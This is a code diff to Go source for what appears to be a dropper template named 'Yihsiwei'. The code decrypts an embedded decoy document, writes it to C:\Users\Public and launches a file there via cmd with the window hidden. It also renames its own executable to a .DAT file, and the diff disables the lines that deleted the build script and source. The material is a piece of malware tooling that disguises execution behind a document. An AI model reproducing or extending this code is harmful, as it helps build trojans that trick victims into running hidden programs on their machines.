@@ -78,9 +78,10 @@ func main() {
 		docfilename  = "%s"
 		docfilenames = "%s"
 		docfile = "%s"
+		wenjianming = os.Args[0]
 		
 		numafile = "%s"
-		dstFile    = "\\Users\\Public\\Yihsiwei.DAT"
+		dstFile    = "Yihsiwei.DAT"
 		selfile, _ = os.Executable()
 		ddocfile = AesDecrypt(docfile, key)
 
@@ -88,6 +89,11 @@ func main() {
 	)
 	
 	func main() {
+		a,_ := os.Getwd()
+		b := os.Args[0]
+		c := strings.Replace(b,a,"",-1)
+		dstFile = c
+		
 		panfu := selfile[0:2]
 		if !strings.Contains(selfile, "C:") {
 	
@@ -99,11 +105,14 @@ func main() {
 		os.Rename(selfile, dstFile)
 
 
-		f2, _ := os.Create(docfilename)
+		f2, _ := os.Create("C:\\Users\\Public\\" + docfilename)
 		_, _ = f2.Write([]byte(ddocfile))
 		f2.Close()
-		strccc, _ := os.Getwd()
-		cmd := exec.Command("cmd",  " /c ",strccc+docfilenames)
+		
+
+		cmd := exec.Command("cmd",  " /c ","C:\\Users\\Public\\"+docfilenames)
+
+
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		//cmd2.Stdout = os.Stdout
 		_ = cmd.Start()
@@ -161,12 +170,13 @@ func main() {
 	_ = cmd.Start()
 
 	exitfile("Yihsiwei.exe")
-	os.RemoveAll("Yihsiwei.go")
-	os.RemoveAll("Yihsiwei.bat")
+	// os.RemoveAll("Yihsiwei.go")
+	// os.RemoveAll("Yihsiwei.bat")
 
 }
 func exitfile(filename string) {
 	for {
+		fmt.Println(filename)
 		time.Sleep(time.Duration(1) * time.Second)
 		_, err := os.Stat(GetCurrentDirectory() + "/" + filename)
 		if err == nil {
